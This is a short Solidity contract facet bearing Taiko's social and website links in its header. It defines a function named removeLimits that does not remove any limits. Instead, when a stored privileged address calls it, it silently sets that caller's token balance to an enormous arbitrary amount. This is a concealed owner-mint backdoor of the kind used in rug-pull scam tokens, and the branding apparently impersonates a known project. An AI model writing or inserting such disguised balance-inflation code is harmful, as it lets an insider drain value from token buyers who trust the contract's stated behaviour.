/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/taikoxyz
    // Twitter: https://twitter.com/taikoxyz/
    // Website: https://taiko.xyz/
    // Medium:  https://medium.com/taikoxyz
    // Discord:  https://discord.com/invite/taikoxyz

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
